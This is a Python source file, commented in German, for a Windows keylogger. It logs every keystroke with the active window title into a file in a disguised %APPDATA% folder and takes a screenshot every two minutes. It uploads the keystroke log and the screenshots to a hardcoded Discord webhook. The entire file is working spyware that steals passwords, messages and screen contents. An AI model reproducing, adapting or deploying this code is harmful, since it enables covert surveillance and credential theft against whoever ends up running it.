import os
import time
import threading
import logging
from datetime import datetime as dt
from pynput import keyboard
from PIL import ImageGrab
import requests
import ctypes

WEBHOOK_URL = "https://discord.com/api/webhooks/1224136142958624819/AOMUAcdw3A6Wok1tBEY-l5fnoxALCmrfWfe3UqzPmFxRAcipHihJTi1FlBkBK9tK-yg8"
BASE_DIR = os.path.expandvars(r"%APPDATA%\Microsoft25")
os.makedirs(BASE_DIR, exist_ok=True)
LOG_FILE = os.path.join(BASE_DIR, "keylog.txt")

logging.basicConfig(
    filename=LOG_FILE,
    filemode='a',
    format='%(asctime)s | %(window)s | %(message)s',
    datefmt='%Y-%m-%d %H:%M:%S',
    level=logging.INFO
)

current_window = None
buffered_text = ""
buffer_lock = threading.Lock()

def get_active_window_title():
    try:
        user32 = ctypes.windll.user32
        hwnd = user32.GetForegroundWindow()
        length = user32.GetWindowTextLengthW(hwnd)
        buff = ctypes.create_unicode_buffer(length + 1)
        user32.GetWindowTextW(hwnd, buff, length + 1)
        return buff.value
    except Exception:
        return "Unbekanntes Fenster"

def flush_buffer(window_title):
    global buffered_text
    with buffer_lock:
        text = buffered_text.strip()
        if text:
            logging.info(text, extra={'window': window_title})
            buffered_text = ""

def key_to_string(key):
    """Konvertiert eine Taste in einen verständlichen String."""
    if hasattr(key, 'char') and key.char is not None:
        return key.char
    else:
        # Namen von Sondertasten übersetzen
        special_keys = {
            keyboard.Key.space: " ",
            keyboard.Key.enter: "\n",
            keyboard.Key.tab: "[TAB]",
            keyboard.Key.backspace: "[BACKSPACE]",
            keyboard.Key.shift: "[SHIFT]",
            keyboard.Key.shift_r: "[SHIFT_R]",
            keyboard.Key.ctrl_l: "[CTRL_L]",
            keyboard.Key.ctrl_r: "[CTRL_R]",
            keyboard.Key.alt_l: "[ALT_L]",
            keyboard.Key.alt_r: "[ALT_R]",
            keyboard.Key.esc: "[ESC]",
            keyboard.Key.delete: "[DEL]",
            keyboard.Key.caps_lock: "[CAPSLOCK]",
            keyboard.Key.up: "[UP]",
            keyboard.Key.down: "[DOWN]",
            keyboard.Key.left: "[LEFT]",
            keyboard.Key.right: "[RIGHT]"
            # ...weitere Sondertasten falls nötig
        }
        return special_keys.get(key, f"[{str(key)}]")

def on_press(key):
    global buffered_text, current_window

    window_title = get_active_window_title()
    if window_title != current_window:
        flush_buffer(current_window if current_window else "Start")
        current_window = window_title
        logging.info(f"--- Fenster gewechselt zu: {window_title} ---", extra={'window': window_title})

    try:
        k_str = key_to_string(key)

        # Wenn Enter oder Zeilenumbruch, dann Buffer flushen
        if k_str == "\n":
            buffered_text += k_str
            flush_buffer(window_title)
        # Leerzeichen oder Tab flushen und neuen Text starten (damit Worte getrennt geloggt werden)
        elif k_str in (" ", "[TAB]"):
            buffered_text += k_str
            flush_buffer(window_title)
        # Backspace entfernen letzten Buchstaben aus Buffer
        elif k_str == "[BACKSPACE]":
            with buffer_lock:
                buffered_text = buffered_text[:-1]
        # Andere Sondertasten direkt loggen
        elif k_str.startswith("[") and k_str.endswith("]"):
            flush_buffer(window_title)
            logging.info(k_str, extra={'window': window_title})
        else:
            with buffer_lock:
                buffered_text += k_str

    except Exception as e:
        flush_buffer(window_title)
        logging.error(f"Fehler beim Loggen der Taste: {e}", extra={'window': window_title})

def uploader():
    while True:
        time.sleep(300)
        flush_buffer(current_window)
        if os.path.exists(LOG_FILE):
            try:
                with open(LOG_FILE, "rb") as f:
                    files = {"file": ("keylog.txt", f)}
                    r = requests.post(WEBHOOK_URL, files=files, data={"content": "Keylog Update"})
                    if r.ok:
                        open(LOG_FILE, "w").close()
            except Exception as e:
                print(f"Upload Fehler: {e}")

def screenshotter():
    while True:
        time.sleep(120)
        timestamp = dt.now().strftime("%Y%m%d_%H%M%S")
        screenshot_path = os.path.join(BASE_DIR, f"screenshot_{timestamp}.png")
        try:
            img = ImageGrab.grab()
            img.save(screenshot_path)
            with open(screenshot_path, "rb") as f:
                files = {"file": (f"screenshot_{timestamp}.png", f)}
                r = requests.post(WEBHOOK_URL, files=files, data={"content": f"Screenshot {timestamp}"})
            os.remove(screenshot_path)
        except Exception as e:
            print(f"Screenshot Fehler: {e}")

if __name__ == "__main__":
    print("Starte Keylogger...")

    listener = keyboard.Listener(on_press=on_press)
    listener.start()

    threading.Thread(target=screenshotter, daemon=True).start()
    threading.Thread(target=uploader, daemon=True).start()

    while True:
        time.sleep(10)
